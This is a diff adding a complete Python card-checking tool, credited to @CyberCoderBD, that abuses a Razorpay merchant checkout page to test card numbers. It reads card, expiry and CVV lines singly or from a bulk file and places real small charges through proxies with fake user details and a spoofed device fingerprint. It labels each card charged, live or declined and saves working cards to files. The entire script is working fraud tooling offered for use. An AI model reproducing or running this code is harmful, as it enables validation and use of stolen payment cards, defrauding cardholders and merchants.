+        "_[platform]": "browser",
+        "_[referer]": site_url,
+        "amount": amount_paise,
+        "order_id": order_id,
+        "device_fingerprint[fingerprint_payload]": DEVICE_FINGERPRINT,
+        "method": "card",
+        "card[number]": card_number,
+        "card[cvv]": cvv,
+        "card[name]": user_info["name"],
+        "card[expiry_month]": exp_month,
+        "card[expiry_year]": exp_year,
+        "save": "0"
+    }
+    return session.post(url, headers=headers, params=params, data=urlencode(data), timeout=20)
+
+
+def check_payment_status(payment_id, key_id, session_token, keyless_header):
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-session-token': session_token,
+    }
+    params = {
+        'key_id': key_id,
+        'session_token': session_token,
+        'keyless_header': keyless_header,
+    }
+    try:
+        r = requests.get(
+            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}',
+            params=params, headers=headers, timeout=15
+        )
+        if r.status_code == 200:
+            data = r.json()
+            return data.get('status', 'unknown'), data
+        return 'unknown', {'error': f'Status check failed: {r.status_code}'}
+    except Exception as e:
+        return 'unknown', {'error': f'Status check error: {e}'}
+
+
+def cancel_payment(payment_id, key_id, session_token, keyless_header):
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Content-type': 'application/x-www-form-urlencoded',
+        'Referer': 'https://api.razorpay.com/v1/checkout/public?traffic_env=production',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'x-session-token': session_token,
+    }
+    params = {
+        'key_id': key_id,
+        'session_token': session_token,
+        'keyless_header': keyless_header,
+    }
+    try:
+        r = requests.get(
+            f'https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel',
+            params=params, headers=headers, timeout=15
+        )
+        try:
+            return r.json()
+        except json.JSONDecodeError:
+            return {"error": {"description": f"Cancel HTTP {r.status_code}: {r.text[:200]}"}}
+    except Exception as e:
+        return {"error": {"description": f"Cancel request error: {e}"}}
+
+
+def handle_3ds_redirect(redirect_url):
+    try:
+        with sync_playwright() as p:
+            browser_args = ['--no-sandbox', '--disable-dev-shm-usage'] if platform.system() == 'Linux' else []
+            browser = p.chromium.launch(headless=True, proxy=PROXY_CONFIG, args=browser_args)
+            page = browser.new_page()
+            page.set_extra_http_headers({
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+            })
+            page.goto(redirect_url, timeout=45000, wait_until='networkidle')
+
+            html_content = page.content()
+            body_text = page.locator("body").inner_text()
+
+            browser.close()
+
+            if 'razorpay_signature' in html_content or 'payment successful' in body_text.lower():
+                return "SUCCESS"
+
+            return body_text.strip()[:150] if body_text.strip() else "No response text"
+    except Exception as e:
+        return f"3DS error: {str(e)[:80]}"
+
+
+def parse_decline_reason(cancel_data):
+    if isinstance(cancel_data, dict) and "error" in cancel_data:
+        err = cancel_data["error"]
+        if isinstance(err, dict):
+            desc = err.get('description', 'Declined')
+            reason = err.get('reason', '')
+            code = err.get('code', '')
+            desc = desc.replace("%s", "Card")
+            parts = [desc]
+            if reason and reason != 'unknown':
+                parts.append(f"Reason: {reason}")
+            if code and code != 'N/A':
+                parts.append(f"Code: {code}")
+            return " | ".join(parts)
+        return str(err)
+    return json.dumps(cancel_data)[:100] if cancel_data else "Unknown decline reason"
+
+
+def process_card(cc_line, plid, ppiid, kid, kh, stoken, site_url, amount_paise):
+    start = time.time()
+    try:
+        num, mm, yy, cvv = cc_line.strip().split('|')
+    except ValueError:
+        return "SKIP", "Invalid format (need card|mm|yy|cvv)", 0, {}
+
+    session = requests.Session()
+
+    order_id = create_order(session, plid, amount_paise, ppiid)
+    if not order_id:
+        return "FAIL", "Order creation failed", round(time.time() - start, 2), {}
+
+    time.sleep(random.uniform(1, 2))
+
+    try:
+        user_info = random_user_info()
+        response = submit_payment(
+            session, order_id, (num, mm, yy, cvv),
+            user_info, amount_paise, kid, kh, plid, stoken, site_url
+        )
+        pdata = response.json()
+    except Exception as e:
+        return "ERROR", f"Payment submission failed: {str(e)[:60]}", round(time.time() - start, 2), {}
+
+    pid = pdata.get("payment_id") or pdata.get("razorpay_payment_id")
+    if not pid and isinstance(pdata.get("payment"), dict):
+        pid = pdata["payment"].get("id")
+
+    if pdata.get("redirect") == True or pdata.get("type") == "redirect":
+        rurl = pdata.get('request', {}).get('url') if isinstance(pdata.get('request'), dict) else None
+        if rurl and pid:
+            time.sleep(3)
+
+            stat, sdata = check_payment_status(pid, kid, stoken, kh)
+
+            if stat in ['captured', 'authorized']:
+                return "CHARGED", f"ID: {pid} | Status: {stat}", round(time.time() - start, 2), pdata
+
+            if stat == 'failed':
+                reason = "Payment failed"
+                if isinstance(sdata, dict):
+                    err = sdata.get('error_description') or sdata.get('error', {}).get('description', '')
+                    if err:
+                        reason = err
+                return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
+
+            if stat == 'created':
+                return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata
+
+            cdata = cancel_payment(pid, kid, stoken, kh)
+            if isinstance(cdata, dict) and "error" in cdata:
+                err = cdata["error"]
+                if isinstance(err, dict):
+                    reason_code = err.get('reason', '')
+                    desc = err.get('description', '')
+                    if reason_code == 'payment_cancelled':
+                        return "LIVE", f"ID: {pid} | 3DS/OTP Required (Card is Live)", round(time.time() - start, 2), pdata
+                    else:
+                        return "DECLINED", f"ID: {pid} | {desc}", round(time.time() - start, 2), pdata
+
+            reason = parse_decline_reason(cdata)
+            return "DECLINED", f"ID: {pid} | {reason}", round(time.time() - start, 2), pdata
+
+        return "FAIL", f"3DS redirect missing URL (pid={pid})", round(time.time() - start, 2), pdata
+
+    if "razorpay_signature" in pdata or "signature" in pdata:
+        sig = pdata.get('razorpay_signature') or pdata.get('signature')
+        return "CHARGED", f"ID: {pid} | Immediate success", round(time.time() - start, 2), pdata
+
+    if "error" in pdata:
+        err = pdata.get('error', {})
+        if isinstance(err, dict):
+            desc = err.get('description', 'Unknown error').replace("%s", "Card")
+            code = err.get('code', 'N/A')
+            reason = err.get('reason', '')
+            msg = f"{desc} (Code: {code})"
+            if reason:
+                msg += f" [Reason: {reason}]"
+            if pid:
+                msg = f"ID: {pid} | {msg}"
+            return "DECLINED", msg, round(time.time() - start, 2), pdata
+        return "DECLINED", f"Error: {json.dumps(err)[:80]}", round(time.time() - start, 2), pdata
+
+    return "UNKNOWN", f"Response: {json.dumps(pdata)[:100]}", round(time.time() - start, 2), pdata
+
+
+def colorize(tag, text):
+    colors = {
+        "CHARGED": "\033[92m",
+        "LIVE": "\033[96m",
+        "DECLINED": "\033[91m",
+        "ERROR": "\033[93m",
+        "FAIL": "\033[93m",
+        "SKIP": "\033[90m",
+        "UNKNOWN": "\033[95m",
+        "RESET": "\033[0m",
+    }
+    c = colors.get(tag, "")
+    r = colors["RESET"]
+    return f"{c}[{tag}]{r} {text}"
+
+
+def show_banner():
+    R = "\033[91m"
+    C = "\033[96m"
+    Y = "\033[93m"
+    M = "\033[95m"
+    X = "\033[0m"
+
+    banner = f"""
+{R}╔══════════════════════════════════════════════════════════════════╗
+║                                                                  ║
+║   {Y} █████╗ ██╗   ██╗████████╗ ██████╗                            {R}║
+║   {Y}██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗                           {R}║
+║   {Y}███████║██║   ██║   ██║   ██║   ██║                            {R}║
+║   {Y}██╔══██║██║   ██║   ██║   ██║   ██║                            {R}║
+║   {Y}██║  ██║╚██████╔╝   ██║   ╚██████╔╝                            {R}║
+║   {Y}╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝                             {R}║
+║                                                                  ║
+║   {C}██████╗  ██████╗ ███████╗███████╗██████╗ ██████╗  █████╗ ██╗   ██╗{R}║
+║   {C}██╔══██╗██╔═══██╗╚══███╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝{R}║
+║   {C}██████╔╝██║   ██║  ███╔╝ █████╗  ██████╔╝██████╔╝███████║ ╚████╔╝ {R}║
+║   {C}██╔══██╗██║   ██║ ███╔╝  ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██║  ╚██╔╝  {R}║
+║   {C}██║  ██║╚██████╔╝███████╗███████╗██║  ██║██║     ██║  ██║   ██║   {R}║
+║   {C}╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝   ╚═╝   {R}║
+║                                                                  ║
+║{M}  ┌──────────────────────────────────────────────────────────┐    {R}║
+║{M}  │             ★  BY @CyberCoderBD  ★                        │    {R}║
+║{M}  │         FREE SCRIPT — DO NOT SELL                       │    {R}║
+║{M}  │         Telegram: @CyberCoderBD                           │    {R}║
+║{M}  └──────────────────────────────────────────────────────────┘    {R}║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝{X}
+"""
+    print(banner)
+
+
+def setup_checker():
+    global PROXY_CONFIG
+
+    site = input("  Razorpay Site URL: ").strip()
+    if not site:
+        site = "https://razorpay.me/@thepunjabistore"
+
+    proxy_file = input("  Proxy file path (Enter to skip): ").strip()
+    if proxy_file and os.path.exists(proxy_file):
+        with open(proxy_file, 'r') as f:
+            proxy_line = f.readline().strip()
+        PROXY_CONFIG = setup_proxy(proxy_line)
+        if PROXY_CONFIG:
+            print(f"  [+] Proxy loaded: {PROXY_CONFIG['server']}")
+    elif proxy_file:
+        PROXY_CONFIG = setup_proxy(proxy_file)
+        if PROXY_CONFIG:
+            print(f"  [+] Proxy set: {PROXY_CONFIG['server']}")
+
+    price_input = input("  Amount in Rupees [default: 1]: ").strip()
+    try:
+        amount_rupees = int(price_input) if price_input else 1
+    except ValueError:
+        amount_rupees = 1
+    amount_paise = amount_rupees * 100
+
+    print(f"\n  [~] Setting up... please wait")
+    kh, kid, plid, ppiid, err = extract_merchant_data(site)
+    if err:
+        print(f"  [-] FATAL: {err}")
+        return None
+
+    stoken, err = get_dynamic_session_token()
+    if err:
+        print(f"  [-] FATAL: {err}")
+        return None
+
+    print(f"  [+] Ready!\n")
+    return {
+        "site": site, "kh": kh, "kid": kid, "plid": plid,
+        "ppiid": ppiid, "stoken": stoken, "amount_paise": amount_paise,
+        "amount_rupees": amount_rupees
+    }
+
+
+def single_check(cfg):
+    cc = input("  Enter CC (card|mm|yy|cvv): ").strip()
+    if not cc or '|' not in cc:
+        print("  [!] Invalid format.")
+        return
+
+    masked = f"{cc[:6]}****{cc.split('|')[0][-4:]}" if len(cc) > 15 else cc[:10]
+    print(f"\n  Checking {masked}...\n")
+
+    try:
+        tag, msg, elapsed, full_resp = process_card(
+            cc, cfg["plid"], cfg["ppiid"], cfg["kid"], cfg["kh"],
+            cfg["stoken"], cfg["site"], cfg["amount_paise"]
+        )
+        print(colorize(tag, msg))
+        print(f"\n  Full Response:")
+        print(f"  {json.dumps(full_resp, indent=2)}")
+        print(f"\n  Time: {elapsed}s | @CyberCoderBD")
+
+        if tag == "CHARGED":
+            with open("charged.txt", "a") as f:
+                f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
+        elif tag == "LIVE":
+            with open("lives.txt", "a") as f:
+                f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
+    except Exception as e:
+        print(colorize("ERROR", str(e)[:80]))
+
+
+def mass_check(cfg):
+    cc_file = input("  CC file path: ").strip()
+    if not cc_file or not os.path.exists(cc_file):
+        print("  [!] File not found.")
+        return
+
+    with open(cc_file, 'r') as f:
+        cards = [line.strip() for line in f if line.strip() and '|' in line]
+
+    if not cards:
+        print("  [!] No valid cards in file.")
+        return
+
+    print(f"\n  Processing {len(cards)} card(s) @ ₹{cfg['amount_rupees']} | @CyberCoderBD\n")
+    print("-" * 65)
+
+    charged = 0
+    live = 0
+    declined = 0
+    errors = 0
+    token_uses = 0
+    stoken = cfg["stoken"]
+
+    for i, cc in enumerate(cards, 1):
+        token_uses += 1
+        if token_uses > 15:
+            new_token, _ = get_dynamic_session_token()
+            if new_token:
+                stoken = new_token
+                token_uses = 0
+
+        masked = f"{cc[:6]}****{cc.split('|')[0][-4:]}" if len(cc) > 15 else cc[:10]
+        print(f"  [{i}/{len(cards)}] {masked} : ", end="", flush=True)
+
+        try:
+            tag, msg, elapsed, _ = process_card(
+                cc, cfg["plid"], cfg["ppiid"], cfg["kid"], cfg["kh"],
+                stoken, cfg["site"], cfg["amount_paise"]
+            )
+            print(colorize(tag, f"{msg}  ({elapsed}s)"))
+
+            if tag == "CHARGED":
+                charged += 1
+                with open("charged.txt", "a") as f:
+                    f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
+            elif tag == "LIVE":
+                live += 1
+                with open("lives.txt", "a") as f:
+                    f.write(f"{cc} | {tag} | {msg} | {datetime.now().isoformat()}\n")
+            elif tag == "DECLINED":
+                declined += 1
+            else:
+                errors += 1
+
+        except KeyboardInterrupt:
+            print("\n\n  [!] Stopped.")
+            break
+        except Exception as e:
+            print(colorize("ERROR", str(e)[:60]))
+            errors += 1
+
+        if i < len(cards):
+            time.sleep(random.uniform(0.5, 1.5))
+
+    print("-" * 65)
+    print(f"\n  Results: {charged} charged / {live} live / {declined} declined / {errors} errors")
+    if charged > 0:
+        print(f"  [+] Charged saved to: charged.txt")
+    if live > 0:
+        print(f"  [+] Lives saved to: lives.txt")
+    print(f"\n  @CyberCoderBD\n")
+
+
+def main():
+    show_banner()
+
+    print("  [1] Single Check")
+    print("  [2] Mass Check\n")
+    choice = input("  Select (1/2): ").strip()
+
+    if choice not in ['1', '2']:
+        print("  [!] Invalid choice.")
+        return
+
+    cfg = setup_checker()
+    if not cfg:
+        return
+
+    if choice == '1':
+        single_check(cfg)
+    else:
+        mass_check(cfg)
+
+    print(f"  Script by @CyberCoderBD — FREE, do NOT sell!")
+    print(f"  Telegram: @CyberCoderBD\n")
+
+
+if __name__ == "__main__":
+    main()
